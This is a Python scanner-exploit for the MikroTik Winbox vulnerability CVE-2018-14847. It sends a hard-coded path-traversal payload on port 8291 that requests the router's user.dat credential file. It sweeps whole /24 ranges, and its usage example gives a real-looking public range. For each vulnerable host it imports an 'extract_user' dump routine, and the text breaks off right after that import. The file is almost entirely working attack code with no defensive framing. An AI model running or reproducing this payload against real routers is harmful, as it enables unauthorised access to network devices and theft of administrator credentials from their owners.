#!/usr/bin/env python3
import socket
import sys

def check_vulnerable(ip, port=8291, timeout=3):
    """Check if IP is vulnerable to CVE-2018-14847"""
    hello = bytearray([
        0x68, 0x01, 0x00, 0x66, 0x4d, 0x32, 0x05, 0x00,
        0xff, 0x01, 0x06, 0x00, 0xff, 0x09, 0x05, 0x07,
        0x00, 0xff, 0x09, 0x07, 0x01, 0x00, 0x00, 0x21,
        0x35, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2e, 0x2f,
        0x2e, 0x2e, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f,
        0x2e, 0x2f, 0x2e, 0x2e, 0x2f, 0x2f, 0x2f, 0x2f,
        0x2f, 0x2f, 0x2e, 0x2f, 0x2e, 0x2e, 0x2f, 0x66,
        0x6c, 0x61, 0x73, 0x68, 0x2f, 0x72, 0x77, 0x2f,
        0x73, 0x74, 0x6f, 0x72, 0x65, 0x2f, 0x75, 0x73,
        0x65, 0x72, 0x2e, 0x64, 0x61, 0x74, 0x02, 0x00,
        0xff, 0x88, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0xff, 0x88,
        0x02, 0x00, 0x02, 0x00, 0x00, 0x00, 0x02, 0x00,
        0x00, 0x00
    ])
    
    try:
        s = socket.socket()
        s.settimeout(timeout)
        s.connect((ip, port))
        s.send(hello)
        d = s.recv(1024)
        s.close()
        
        if len(d) > 38:
            return True, d
        return False, None
    except Exception as e:
        return False, None

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python scanner.py <IP or CIDR>")
        print("Example: python scanner.py 46.161.192.0/24")
        sys.exit(1)
    
    target = sys.argv[1]
    
    if "/" in target:
        base = target.split("/")[0].rsplit(".", 1)[0]
        for i in range(1, 255):
            ip = f"{base}.{i}"
            vuln, data = check_vulnerable(ip)
            if vuln:
                print(f"[+] VULNERABLE: {ip}")
            else:
                print(f"[-] {ip}")
    else:
        vuln, data = check_vulnerable(target)
        if vuln:
            print(f"[+] VULNERABLE: {target}")
            from extract_user import dump
